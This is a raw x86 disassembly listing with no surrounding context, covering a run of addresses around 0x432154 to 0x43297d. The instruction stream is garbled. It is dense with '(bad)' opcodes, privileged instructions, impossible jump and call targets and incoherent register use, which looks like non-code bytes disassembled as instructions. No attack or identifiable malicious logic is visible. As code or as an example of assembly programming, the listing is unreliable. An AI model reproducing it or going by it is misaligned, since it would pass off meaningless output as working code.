  432154:	mov    ecx,DWORD PTR [ebx+0x489408]
  43215a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432160:	push   ecx
  432161:	jo     0x43214b
  432163:	inc    DWORD PTR [edi]
  432165:	or     BYTE PTR [eax],al
  432167:	call   0xce28b1
  43216c:	fmul   QWORD PTR [ebp+0x55]
  43216f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432175:	mov    bh,0x8c
  432177:	adc    al,0x9b
  432179:	dec    esp
  43217a:	xor    bl,BYTE PTR [eax]
  43217c:	mov    ecx,DWORD PTR [ebp+0xc]
  43217f:	mov    eax,DWORD PTR [ebp-0x4]
  432182:	mov    esi,DWORD PTR [edi-0x3148f924]
  432188:	push   es
  432189:	retf   
  43218a:	mov    BYTE PTR [ebp-0x30],0x3b
  43218e:	inc    ebp
  43218f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432196:	retf   0x83fc
  432199:	into   
  43219a:	dec    ebp
  43219b:	retf   
  43219c:	mov    ecx,DWORD PTR [ebp-0x74]
  43219f:	mov    eax,DWORD PTR [eax]
  4321a1:	fdiv   QWORD PTR [ebx]
  4321a3:	mov    bh,0x3
  4321a5:	push   es
  4321a6:	mov    esi,ecx
  4321a8:	sbb    cl,dl
  4321aa:	dec    ebp
  4321ab:	sar    DWORD PTR [ebx],cl
  4321ad:	push   ebp
  4321ae:	jne    0x4321bf
  4321b0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4321b6:	lea    ebx,[eax]
  4321b8:	call   0xf4ccad7f
  4321bd:	sbb    dh,dl
  4321bf:	add    edx,ebx
  4321c1:	push   ebp
  4321c2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4321c8:	push   ecx
  4321c9:	mov    DWORD PTR [eax-0x30],edx
  4321cc:	test   DWORD PTR [edx],eax
  4321ce:	xadd   esp,esi
  4321d1:	pop    es
  4321d2:	add    cl,dl
  4321d4:	mov    eax,ecx
  4321d6:	or     al,0x45
  4321d8:	(bad)  
  4321d9:	push   eax
  4321da:	add    DWORD PTR [edx+0x0],eax
  4321dd:	add    ecx,DWORD PTR [ecx]
  4321df:	and    dh,cl
  4321e1:	call   0xc72ab1
  4321e6:	add    DWORD PTR [ebp+0x0],edx
  4321e9:	mov    esp,DWORD PTR [ebp+0x18]
  4321ec:	add    BYTE PTR [eax+0x50],cl
  4321ef:	xor    eax,DWORD PTR [eax]
  4321f1:	add    esp,DWORD PTR [esi+0x3b]
  4321f4:	inc    ebp
  4321f5:	je     0x43217a
  4321f7:	push   ecx
  4321f8:	dec    BYTE PTR [ebp-0x77]
  4321fb:	add    eax,esi
  4321fd:	or     al,0x5e
  4321ff:	inc    eax
  432200:	add    BYTE PTR [ebx],al
  432202:	data16 and BYTE PTR [ebp+0x50],al
  432206:	sub    DWORD PTR [ecx],0xfffffff8
  432209:	add    BYTE PTR [ebp-0x75],ah
  43220c:	add    BYTE PTR [eax],bl
  43220e:	enter  0x894d,0x8b
  432212:	int3   
  432213:	loopne 0x4321d7
  432215:	rol    BYTE PTR [eax],0x33
  432218:	lea    cx,[ebp+0xa]
  43221c:	data16 jb 0x432264
  43221f:	add    BYTE PTR [ebx+0x44890855],cl
  432225:	sbb    ah,al
  432227:	inc    ebp
  432228:	cmp    al,0xf
  43222a:	add    BYTE PTR [edx+0x66],dl
  43222d:	xor    ecx,DWORD PTR [eax]
  43222f:	sub    eax,DWORD PTR [edx]
  432231:	mov    eax,DWORD PTR [eax]
  432233:	or     al,0x66
  432235:	ror    edx,cl
  432237:	dec    ebp
  432238:	inc    ebp
  432239:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43223f:	cld    
  432240:	or     BYTE PTR [edi+0x4501dd],dl
  432246:	ret    0xecce
  432249:	retf   
  43224a:	(bad)  
  43224b:	dec    ebp
  43224c:	mov    al,0x8b
  43224e:	loopne 0x432270
  432250:	cmp    ecx,DWORD PTR [edx]
  432252:	inc    ebp
  432253:	daa    
  432254:	loopne 0x4321dd
  432256:	in     al,dx
  432257:	add    edi,eax
  432259:	add    BYTE PTR [eax+0x3f52e155],bh
  43225f:	push   ebp
  432260:	inc    ebp
  432261:	xor    ebx,edx
  432263:	add    ebp,esp
  432265:	push   edx
  432266:	push   bp
  432268:	inc    ebp
  432269:	(bad)  
  43226a:	in     eax,dx
  43226b:	push   esp
  43226c:	(bad)  
  43226d:	inc    edx
  43226f:	sbb    al,0x33
  432271:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432278:	add    BYTE PTR [ebp+0x46],0x8b
  43227c:	jmp    0xf98b:0x100041c8
  432283:	xor    esi,DWORD PTR [edx+0x3]
  432286:	mov    ecx,DWORD PTR [edi]
  432288:	fmul   DWORD PTR [edx]
  43228a:	add    BYTE PTR [eax],al
  43228c:	lea    eax,[ebx-0x4700273c]
  432292:	add    al,0x4f
  432294:	pop    DWORD PTR [eax]
  432296:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43229c:	push   edx
  43229d:	inc    WORD PTR [ebp+0x8]
  4322a1:	mov    eax,0x514f4d
  4322a6:	(bad)
  4322aa:	add    al,al
  4322ac:	xor    DWORD PTR [ebx-0x74baf730],eax
  4322b2:	test   DWORD PTR [esi+0x74],esp
  4322b5:	inc    ebp
  4322b6:	mov    DWORD PTR [eax+0xa4e08],edi
  4322bc:	add    BYTE PTR [ecx-0x76c435bb],cl
  4322c2:	or     dh,cl
  4322c4:	or     eax,0x8b8d5045
  4322c9:	inc    ebp
  4322ca:	mov    WORD PTR [ecx+0x3b8a00],?
  4322d0:	jne    0x432305
  4322d2:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4322d8:	add    DWORD PTR [ebx],eax
  4322da:	add    bh,bh
  4322dc:	adc    DWORD PTR [eax],ecx
  4322de:	adc    DWORD PTR [ebp+0x55],edi
  4322e1:	push   es
  4322e2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4322e8:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4322ef:	inc    ebp
  4322f0:	mov    esp,edi
  4322f2:	or     al,0xda
  4322f4:	push   eax
  4322f5:	(bad)  
  4322f6:	jne    0x4322ac
  4322f8:	call   0x3b1be7
  4322fd:	inc    ebp
  4322fe:	sar    BYTE PTR [eax],0x84
  432301:	in     al,dx
  432302:	add    bh,al
  432304:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  43230b:	(bad)  
  43230c:	and    al,al
  43230e:	fs in  eax,dx
  432310:	inc    DWORD PTR [ebp-0x7b]
  432313:	jle    0x432324
  432315:	leave  
  432316:	scas   al,BYTE PTR es:[edi]
  432317:	inc    esp
  432318:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43231f:	or     BYTE PTR [ebx-0x97717c8],0x83
  432326:	call   DWORD PTR [edi]
  432328:	shr    ah,0x84
  43232b:	xchg   DWORD PTR [eax],eax
  43232d:	add    DWORD PTR [eax],eax
  43232f:	add    bh,bh
  432331:	dec    ebp
  432332:	and    BYTE PTR [ecx-0x38],dl
  432335:	push   eax
  432336:	dec    DWORD PTR [ebx+0xfd885]
  43233c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432342:	mov    WORD PTR [ecx+0x0],ss
  432345:	lea    ecx,[ebx+0x108b20d8]
  43234b:	mov    WORD PTR [edx],ds
  43234d:	add    BYTE PTR [edi+0xff01ff],al
  432353:	mov    ecx,DWORD PTR [ebp-0x28]
  432356:	push   ecx
  432357:	shl    BYTE PTR [ebp+0x3a],0x8b
  43235b:	inc    ebp
  43235c:	in     al,0xeb
  43235e:	jno    0x4322eb
  432360:	push   edx
  432361:	mov    DWORD PTR [eax-0x28],edx
  432364:	mov    eax,DWORD PTR [ebp+0x20]
  432367:	je     0x4322f0
  432369:	mov    eax,DWORD PTR [ecx]
  43236b:	sbb    BYTE PTR [eax],al
  43236d:	pop    DWORD PTR [eax]
  43236f:	add    esi,eax
  432371:	add    bl,al
  432373:	adc    DWORD PTR [edi],esi
  432375:	jmp    0x8bce73c7
  43237a:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  432381:	jne    0x43230e
  432383:	mov    ecx,DWORD PTR [eax]
  432385:	in     al,0x75
  432387:	pop    DWORD PTR [ecx+0x5401]
  43238d:	push   edx
  43238e:	inc    DWORD PTR [ebx]
  432390:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432396:	add    BYTE PTR [edi+0x9],dl
  432399:	call   DWORD PTR [esi]
  43239b:	and    dl,al
  43239d:	and    bh,bh
  43239f:	inc    edi
  4323a1:	test   eax,edx
  4323a3:	sldt   ebx
  4323a6:	xor    al,BYTE PTR [eax]
  4323a8:	pushf  
  4323a9:	(bad)  
  4323aa:	jmp    0x4323b8
  4323ac:	mov    eax,edi
  4323ae:	or     al,0x75
  4323b0:	inc    eax
  4323b1:	call   0x431ab9
  4323b6:	mov    eax,eax
  4323b8:	loopne 0x43233e
  4323ba:	inc    ebp
  4323bb:	add    BYTE PTR [ebx+0x1451c00],cl
  4323c1:	mov    eax,DWORD PTR [ebp+0x20]
  4323c4:	add    edi,ecx
  4323c6:	add    BYTE PTR [eax],ch
  4323c8:	cmp    edi,0x18
  4323cb:	test   DWORD PTR [ebp+0xf],esi
  4323ce:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4323d5:	jne    0x4323d9
  4323d7:	call   0xffa21e9c
  4323dc:	leave  
  4323dd:	rcr    BYTE PTR [esp+eax*4],0x55
  4323e1:	add    ah,ch
  4323e3:	add    BYTE PTR [edi-0x48fef979],dh
  4323e9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4323f0:	inc    esp
  4323f1:	mov    ebx,DWORD PTR [eax]
  4323f3:	fcom   st(2)
  4323f5:	add    BYTE PTR [edi],bl
  4323f7:	lea    ecx,[eax-0x18]
  4323fa:	(bad)  
  4323fb:	push   DWORD PTR [ecx]
  4323fd:	call   0xffb5715f
  432402:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432406:	fstp   DWORD PTR [esi+ebx*8]
  432409:	push   ebp
  43240a:	pop    ebp
  43240b:	mov    esi,DWORD PTR [edx-0x38]
  43240e:	add    DWORD PTR [eax],0x28
  432411:	mov    edi,DWORD PTR [ebx]
  432413:	xor    esi,DWORD PTR [edx+0x3]
  432416:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43241a:	pop    ebp
  43241b:	or     al,0x4
  43241d:	inc    ecx
  43241e:	push   ebp
  43241f:	(bad)  
  432420:	in     al,dx
  432421:	or     ah,ch
  432423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432424:	xbegin 0xffc89a1a
  43242a:	clc    
  43242b:	adc    al,0x45
  43242d:	div    BYTE PTR [edx]
  43242f:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432436:	test   DWORD PTR [ebx+0x666300f8],ebx
  43243c:	add    BYTE PTR [ecx+0x66],dh
  43243f:	add    eax,DWORD PTR [ebp+0x52]
  432442:	adc    eax,0xffffffa0
  432445:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43244b:	test   DWORD PTR [eax],eax
  43244d:	clc    
  43244e:	data16 or al,BYTE PTR [ebp+0x45]
  432452:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432459:	rol    BYTE PTR [ebp+0x45],1
  43245c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432462:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432468:	push   ebx
  432469:	add    BYTE PTR [eax+eax*1+0x51],dl
  43246d:	jge    0x4324a2
  43246f:	add    BYTE PTR [esi+0x4],dl
  432472:	jne    0x4324d9
  432474:	mov    edx,0x457200
  432479:	jmp    0x43243d
  43247b:	xor    edi,DWORD PTR [ebx]
  43247d:	pop    edi
  43247e:	cvtdq2ps xmm7,xmm0
  432481:	ret    0x0
  432484:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43248a:	xor    ecx,DWORD PTR [edi]
  43248c:	add    eax,DWORD PTR [ecx+0x3b]
  43248f:	push   ebx
  432490:	rdpmc  
  432492:	out    0x8d,al
  432494:	add    BYTE PTR [eax],cl
  432496:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43249c:	ret    0x450c
  43249f:	sbb    al,0x8b
  4324a1:	cmp    eax,esi
  4324a3:	or     cl,al
  4324a5:	or     al,0xc2
  4324a7:	pop    eax
  4324a8:	inc    ebp
  4324a9:	add    ecx,DWORD PTR [edi]
  4324ab:	add    esi,DWORD PTR [ebp+0x39]
  4324ae:	invd   
  4324b0:	jge    0x4324bc
  4324b2:	mov    eax,0x478ac0
  4324b7:	cli    
  4324b8:	xor    esp,ecx
  4324ba:	mov    ebx,0x5b8ac0
  4324bf:	ret    0x33
  4324c2:	mov    eax,0x833b8b
  4324c7:	sub    BYTE PTR [ebx],al
  4324c9:	inc    ebp
  4324ca:	xor    ax,di
  4324cd:	pushf  
  4324ce:	inc    bh
  4324d0:	mov    esp,esp
  4324d2:	hlt    
  4324d3:	test   DWORD PTR [ebp-0x8],esi
  4324d6:	mov    eax,DWORD PTR [ebp-0x14]
  4324d9:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4324df:	dec    edi
  4324e0:	or     BYTE PTR [eax],al
  4324e2:	jne    0x43246d
  4324e4:	mov    esi,esp
  4324e6:	call   0x77a9b0ab
  4324eb:	inc    ebp
  4324ec:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4324f2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4324f8:	add    BYTE PTR [esi+0x7d],ah
  4324fb:	inc    ebp
  4324fc:	mov    bx,WORD PTR [ebp+0x8]
  432500:	add    DWORD PTR [ebp+0x54],0x30c008b
  432507:	inc    ebp
  432508:	mov    bx,di
  43250b:	lock test BYTE PTR [ecx+0x7000801],bh
  432512:	jge    0x4324d5
  432514:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  43251a:	cli    
  43251b:	xor    bl,bh
  43251d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432523:	test   BYTE PTR [eax],cl
  432525:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43252c:	cmp    ebp,eax
  43252e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432535:	test   BYTE PTR [ebp+0x1],bh
  432538:	mov    ebx,0x458a00
  43253d:	xor    esi,DWORD PTR [ebx]
  43253f:	add    esp,DWORD PTR [esi-0x77]
  432542:	pop    ebp
  432543:	loopne 0x4325ab
  432545:	inc    ebp
  432546:	clc    
  432547:	xor    edi,DWORD PTR [ebx]
  432549:	add    esi,DWORD PTR [edx-0x77]
  43254c:	data16 fdivr QWORD PTR [ebp-0x49]
  432550:	mov    ebx,0xb78afc
  432555:	hlt    
  432556:	xor    edi,DWORD PTR [esi+eiz*2]
  432559:	add    BYTE PTR [ebp+0x66],bl
  43255c:	data16 lock clc 
  43255f:	cmp    al,0x3b
  432561:	add    BYTE PTR [edi+0x66],dh
  432564:	psubq  mm7,QWORD PTR [ebp+0x2]
  432568:	ltr    WORD PTR [ebp+0x66]
  43256c:	add    esi,eax
  43256e:	add    di,WORD PTR [ebp+0x2b]
  432572:	data16 data16 jge 0x4325f3
  432576:	mov    ebx,0xe08a8b
  43257b:	jge    0x4325b0
  43257d:	data16 data16 xor al,0x5d
  432581:	data16 data16 jne 0x43257d
  432585:	mov    edi,DWORD PTR [ebx]
  432587:	fdiv   QWORD PTR [edx+0x7d]
  43258a:	data16 data16 jge 0x4325c2
  43258e:	mov    ebx,0x758a66
  432593:	mov    esi,0x667233
  432598:	pop    ebp
  432599:	or     BYTE PTR [esi+0x0],ah
  43259c:	clc    
  43259d:	mov    edi,DWORD PTR [ebx]
  43259f:	lock ja 0x43252d
  4325a2:	(bad)  
  4325a4:	jge    0x43259d
  4325a6:	invd   
  4325a8:	pop    ebp
  4325a9:	add    BYTE PTR [ebx],al
  4325ab:	(bad)  
  4325ac:	cmp    di,WORD PTR [ebp+0xf]
  4325b0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4325b4:	mov    bx,WORD PTR [ebp-0x10]
  4325b8:	pop    bp
  4325ba:	fbstp  TBYTE PTR [ebx]
  4325bc:	test   DWORD PTR [ebx],eax
  4325be:	add    BYTE PTR [ebx],bh
  4325c0:	add    BYTE PTR [esi+0x7d],ah
  4325c3:	jge    0x432550
  4325c5:	data16 in al,dx
  4325c7:	pop    ebp
  4325c8:	stc    
  4325c9:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4325d0:	mov    edi,ebx
  4325d2:	in     al,dx
  4325d3:	test   BYTE PTR [ebp+0x0],bh
  4325d6:	mov    eax,DWORD PTR [eax]
  4325d8:	call   0xbd401f68
  4325dd:	cmp    al,0x9b
  4325df:	add    BYTE PTR [edx],dh
  4325e1:	mov    bx,di
  4325e4:	call   0x8b4ba374
  4325e9:	add    ebp,esp
  4325eb:	mov    bx,di
  4325ee:	jnp    0x432616
  4325f0:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4325f6:	mov    eax,DWORD PTR [eax]
  4325f8:	call   0x7c3eb163
  4325fd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432603:	data16 data16 fistp WORD PTR [ebp+0xe]
  432608:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  432612:	fisttp WORD PTR [ecx-0x7401f77b]
  432618:	(bad)  
  432619:	cld    
  43261a:	jne    0x432658
  43261c:	xor    eax,DWORD PTR [eax]
  43261e:	mov    esp,DWORD PTR [esi-0x10]
  432621:	sti    
  432622:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432629:	data16 adc bl,bh
  43262c:	push   ebp
  43262d:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432634:	mov    WORD PTR [eax],es
  432636:	fwait
  432637:	data16 xor bh,bl
  43263a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  432640:	mov    esp,DWORD PTR [esi-0x14]
  432643:	fisttp WORD PTR [ebx-0x3748a9f2]
  432649:	or     al,0x2b
  43264b:	mov    bh,0xba
  43264d:	hlt    
  43264e:	mov    bh,bl
  432650:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432656:	dec    esi
  432657:	or     al,0x0
  432659:	mov    edi,DWORD PTR [ebx]
  43265b:	or     BYTE PTR [ebp+0x3b],dh
  43265e:	mov    ecx,DWORD PTR [edi]
  432660:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432666:	xor    al,0xd8
  432668:	pop    bp
  43266a:	lock xor esi,DWORD PTR [ebx]
  43266d:	lea    esp,[esi+0x1f]
  432670:	icebp  
  432671:	jb     0x432677
  432673:	add    al,al
  432675:	jge    0x432683
  432677:	mov    eax,eax
  432679:	fsubr  st,st(3)
  43267b:	pop    ebp
  43267c:	mov    esi,DWORD PTR [ebx]
  43267e:	in     al,0x8d
  432680:	rcr    DWORD PTR [edi],0xc2
  432683:	jb     0x4326e3
  432685:	add    cl,cl
  432687:	jge    0x432695
  432689:	mov    edx,DWORD PTR [ebp-0x20]
  43268c:	in     al,dx
  43268d:	pop    ebp
  43268e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  432693:	cmp    di,WORD PTR [ebp+0x0]
  432697:	mov    ebp,DWORD PTR [ebx]
  432699:	fdivr  QWORD PTR [esi+0x668a5d]
  43269f:	cmp    al,0x33
  4326a1:	mov    si,0x4e7d
  4326a5:	mov    eax,DWORD PTR [eax]
  4326a7:	lock inc ebp
  4326a9:	mov    esi,DWORD PTR [eax]
  4326ab:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4326b2:	clc    
  4326b3:	(bad)  
  4326b4:	cmp    edi,DWORD PTR [ebx]
  4326b6:	je     0x4326c7
  4326b8:	push   ebx
  4326b9:	loopne 0x4326ca
  4326bb:	dec    ecx
  4326bd:	mov    esp,DWORD PTR [ebp-0x1c]
  4326c0:	int    0xf1
  4326c2:	mov    esi,0x703084d
  4326c7:	pcmpgtd mm6,mm1
  4326ca:	add    BYTE PTR [ebp+0x66],dh
  4326cd:	jmp    0x43269a
  4326cf:	mov    eax,DWORD PTR [ebx]
  4326d1:	lock push ebp
  4326d3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4326d9:	or     bh,dl
  4326db:	jb     0x4326db
  4326dd:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4326e3:	loopne 0x4326e5
  4326e5:	jne    0x4326e9
  4326e7:	data16 add BYTE PTR [esi+eiz*2],dh
  4326eb:	mov    ecx,ebx
  4326ed:	data16 cmp al,0xf1
  4326f0:	add    BYTE PTR [esi+eiz*2],bh
  4326f3:	add    bl,cl
  4326f5:	retw   0xf2
  4326f9:	ret    0x66
  4326fc:	retf   
  4326fd:	enterw 0x4df1,0x19
  432702:	pop    edi
  432703:	jne    0x432686
  432705:	mov    esi,DWORD PTR [eax]
  432707:	call   0x77b7b2a8
  43270c:	xor    ebp,DWORD PTR [ebx]
  43270e:	lea    esp,[esi+0x48]
  432711:	repnz in eax,0x3b
  432714:	add    BYTE PTR [ebp-0x37],dh
  432717:	xor    edx,DWORD PTR [ebp-0x15]
  43271a:	in     al,dx
  43271b:	xor    edx,DWORD PTR [esi+0x40]
  43271e:	mov    DWORD PTR [edi],0x338545fc
  432724:	clc    
  432725:	add    esi,DWORD PTR [ecx]
  432727:	pop    edi
  432728:	pushf  
  432729:	pop    ebx
  43272a:	call   0xff4426f1
  43272f:	mov    edi,eax
  432731:	push   ecx
  432732:	pop    es
  432733:	mov    edi,DWORD PTR [eax]
  432735:	push   esi
  432736:	inc    esi
  432737:	add    bh,BYTE PTR [esi+0x0]
  43273a:	popa   
  43273b:	data16 (bad) 
  43273d:	into   
  43273e:	gs cmp al,0xcd
  432741:	add    BYTE PTR [ecx+0x7ce0866],bh
  432747:	ret    0x66
  43274a:	add    bh,al
  43274c:	add    bh,ah
  43274e:	add    BYTE PTR [ebp+0x31c3f866],al
  432754:	cmp    al,0x9c
  432756:	add    BYTE PTR [esi+0x66],ah
  432759:	into   
  43275a:	ret    
  43275b:	pop    ebp
  43275c:	adc    BYTE PTR [edi+0x0],dl
  43275f:	mov    bh,0x66
  432761:	mov    edi,0xff038dc3
  432766:	jne    0x4327bc
  432768:	lea    edx,[ecx+0x1]
  43276b:	mov    ebx,0xd64ff1
  432770:	sar    DWORD PTR [ebx],1
  432772:	test   BYTE PTR [ebp+0x36],dh
  432775:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432779:	push   edi
  43277a:	xor    BYTE PTR [ebx],0x38
  43277d:	mov    esi,ebx
  43277f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432785:	ss inc ebp
  432787:	fs pop ebx
  432789:	mov    ebx,0x9c3b30
  43278e:	je     0x4327bb
  432790:	xor    edi,DWORD PTR [ebx+0x668a33]
  432796:	mov    WORD PTR [ebx],?
  432798:	ss mov ebx,0x8b4e64
  43279e:	pop    edi
  43279f:	cmp    ecx,ecx
  4327a1:	jne    0x4327f8
  4327a3:	mov    ebp,esp
  4327a5:	cld    
  4327a6:	push   esi
  4327a7:	pop    ebx
  4327a8:	inc    ebp
  4327a9:	stc    
  4327aa:	xor    BYTE PTR [ebp+0x9bef89c],al
  4327b0:	test   esi,ecx
  4327b2:	clc    
  4327b3:	test   dl,dl
  4327b5:	cmp    bh,bh
  4327b7:	fs pop si
  4327ba:	or     bl,al
  4327bc:	add    cl,BYTE PTR [ebx+0x57665100]
  4327c2:	retf   0x3c45
  4327c5:	xor    BYTE PTR [eax],al
  4327c7:	pushf  
  4327c8:	mov    si,0x85ca
  4327cc:	ret    0xf8
  4327cf:	pop    ebx
  4327d0:	dec    dx
  4327d3:	mov    edx,DWORD PTR [edi-0x76]
  4327d6:	push   edi
  4327d7:	add    al,0xb7
  4327d9:	xor    al,0xba
  4327db:	cmp    al,0x8d
  4327dd:	je     0x4327de
  4327df:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4327e3:	lea    edi,[ebx+0x544fff]
  4327e9:	push   ecx
  4327ea:	cmp    edx,DWORD PTR [ebx+0x75]
  4327ed:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4327f3:	add    BYTE PTR [ebx],dh
  4327f5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4327fb:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  432802:	mov    ebx,0x3b3b00
  432807:	jne    0x432834
  432809:	mov    DWORD PTR [ebx+0x728afc],edi
  43280f:	xor    esi,DWORD PTR [ebx]
  432811:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432817:	push   edi
  432818:	cmp    esp,ebp
  43281a:	jne    0x43281c
  43281c:	sbb    DWORD PTR [eax],0x8085c3fc
  432822:	clc    
  432823:	inc    esi
  432824:	pop    ebx
  432825:	sti    
  432826:	add    eax,0xeb8bc075
  43282b:	cld    
  43282c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432832:	mov    ecx,DWORD PTR [ecx+edx*2]
  432835:	rol    DWORD PTR [ebp-0x37],0xf
  432839:	mov    DWORD PTR [eax],ecx
  43283b:	inc    edi
  43283c:	(bad)  
  43283d:	in     eax,0xfe
  43283f:	add    bh,bh
  432841:	(bad)  
  432842:	mov    esi,0xc38a5e
  432847:	mov    esi,DWORD PTR [ebx]
  432849:	push   ecx
  43284a:	mov    edi,0xfc4ec7
  43284f:	test   DWORD PTR [ebp-0x8],edx
  432852:	xor    di,ax
  432855:	pushf  
  432856:	sub    ebp,eax
  432858:	inc    ebp
  432859:	(bad)  
  43285a:	sub    edi,edi
  43285c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432862:	inc    ebp
  432863:	add    BYTE PTR [esi+0x2b],ah
  432866:	or     bh,BYTE PTR [edx+0xf8ac2]
  43286c:	cmp    al,0x33
  43286e:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432874:	(bad)  
  432875:	cmp    esi,DWORD PTR [ebx]
  432877:	je     0x432831
  432879:	push   ebx
  43287a:	dec    esi
  43287b:	str    ecx
  43287e:	cmp    esp,DWORD PTR [ebp+0x75]
  432881:	int    0x33
  432883:	mov    edi,0x789085f
  432888:	mov    edx,DWORD PTR [eax]
  43288a:	cld    
  43288b:	add    cl,cl
  43288d:	data16 add al,0xcb
  432890:	push   ebp
  432891:	add    ebp,esp
  432893:	jne    0x432881
  432895:	(bad)  
  432896:	mov    DWORD PTR [ecx],0xd685f7ec
  43289c:	clc    
  43289d:	xlat   BYTE PTR ds:[ebx]
  43289e:	inc    ebp
  43289f:	mov    esi,DWORD PTR [edx]
  4328a1:	push   eax
  4328a2:	pushf  
  4328a3:	in     eax,0x8b
  4328a5:	add    ah,ch
  4328a7:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4328ab:	add    ax,0x72cb
  4328af:	cmp    al,0x0
  4328b1:	add    BYTE PTR [ebp+0x66],al
  4328b4:	(bad)  
  4328b5:	retf   
  4328b6:	lock ret 0x85
  4328ba:	clc    
  4328bb:	inc    bp
  4328bd:	retf   
  4328be:	cmp    eax,0xc77d9cc8
  4328c3:	xor    ah,bh
  4328c5:	pushf  
  4328c6:	test   DWORD PTR [edi-0x8],ebx
  4328c9:	je     0x432910
  4328cb:	xor    esi,DWORD PTR ds:0x7020840
  4328d1:	ror    BYTE PTR [ebp-0x37],0x8d
  4328d5:	push   ebp
  4328d6:	add    esp,ebp
  4328d8:	jb     0x432865
  4328da:	add    BYTE PTR [eax],cl
  4328dc:	dec    ebp
  4328dd:	mov    bh,0x81
  4328df:	push   esi
  4328e0:	push   esp
  4328e1:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4328e8:	xor    al,BYTE PTR [eax]
  4328ea:	mov    edx,DWORD PTR [edi+0x10]
  4328ed:	(bad)  
  4328ee:	scas   eax,DWORD PTR es:[edi]
  4328ef:	ret    0x3b
  4328f2:	jns    0x3b4425e5
  4328f8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4328fc:	dec    ebp
  4328fd:	or     BYTE PTR [ebx],ch
  4328ff:	ret    0x458b
  432902:	lock jmp 0x4328f6
  432905:	mov    ecx,DWORD PTR [eax]
  432907:	or     BYTE PTR [edi],al
  432909:	mov    ecx,eax
  43290b:	xor    DWORD PTR [edx+0x2],0x0
  43290f:	mov    bh,0xc1
  432911:	adc    BYTE PTR [eax],dh
  432913:	iret   
  432914:	inc    ebp
  432915:	mov    DWORD PTR [ebx],0x4dfff8c4
  43291b:	inc    BYTE PTR [ebx]
  43291d:	ret    0xf8
  432920:	adc    DWORD PTR [esi+0x10],esp
  432923:	clc    
  432924:	dec    ecx
  432925:	fisttp WORD PTR [ecx+0x456604c0]
  43292b:	add    dh,BYTE PTR ds:0x75e0845
  432931:	ret    0x4d
  432934:	lea    ecx,[ebx+0x18728301]
  43293a:	add    BYTE PTR [ebp+0x45],al
  43293d:	xor    ecx,ebp
  43293f:	pushf  
  432940:	add    bh,al
  432942:	add    al,ch
  432944:	inc    ebp
  432945:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43294b:	xor    eax,0x781084d
  432950:	push   esp
  432951:	fwait
  432952:	push   ecx
  432953:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432959:	inc    ebp
  43295a:	cmp    edi,DWORD PTR [ecx]
  43295c:	jbe    0x4328fa
  43295e:	mov    eax,edi
  432960:	or     ah,dh
  432962:	inc    ebp
  432963:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432969:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43296f:	in     al,dx
  432970:	hlt    
  432971:	push   esp
  432972:	push   esp
  432973:	push   ecx
  432974:	push   ecx
  432975:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43297b:	fwait
  43297c:	fwait
  43297d:	xor    dh,BYTE PTR [edx]
